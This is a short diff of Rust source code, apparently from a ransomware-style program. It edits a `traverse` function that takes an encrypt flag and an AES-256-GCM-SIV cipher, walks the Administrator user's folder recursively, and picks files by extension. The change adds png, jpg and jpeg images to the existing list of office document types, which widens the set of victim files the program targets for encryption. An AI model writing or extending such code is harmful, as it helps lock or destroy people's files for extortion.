@@ -169,7 +169,9 @@ fn traverse(do_encrypt: bool, cipher: &mut Aes256GcmSiv) -> Result<(), Error> {
         }
     }
 
-    let valid_extensions = vec!["txt", "pdf", "docx", "doc", "pptx", "ppt", "xlsx", "xls"];
+    let valid_extensions = vec![
+        "txt", "pdf", "docx", "doc", "pptx", "ppt", "xlsx", "xls", "png", "jpg", "jpeg",
+    ];
 
     for entry in WalkDir::new("C:\\Users\\Administrator\\").follow_links(true) {
         match entry {
